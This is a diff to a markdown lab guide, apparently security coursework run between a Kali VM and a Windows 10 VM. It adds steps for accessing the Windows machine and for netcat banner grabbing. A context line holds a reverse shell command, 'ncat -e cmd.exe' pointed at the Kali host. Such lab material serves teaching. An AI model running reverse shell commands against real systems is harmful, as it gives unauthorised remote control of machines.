@@ -174,4 +174,16 @@ ncat -e cmd.exe Kali-IP 1234
 ```
 
 **On Kali VM**
-3. Access 
+3. On Kali, the Win10 VM can be accessed
+4. To close the session, type `exit`
+
+<u>Banner Grabbing:</u>
+5. To get information on the service running on a certain port, run the following command:
+```
+nc -v -b Win10-IP port_number
+```
+
+6. Press <kbd>Ctrl</kbd>+<kbd>C</kbd>
+
+## Linux Vulnerabilities
+### Connecting to a SSH Server and Disabling Remote Root Login using PuTTY
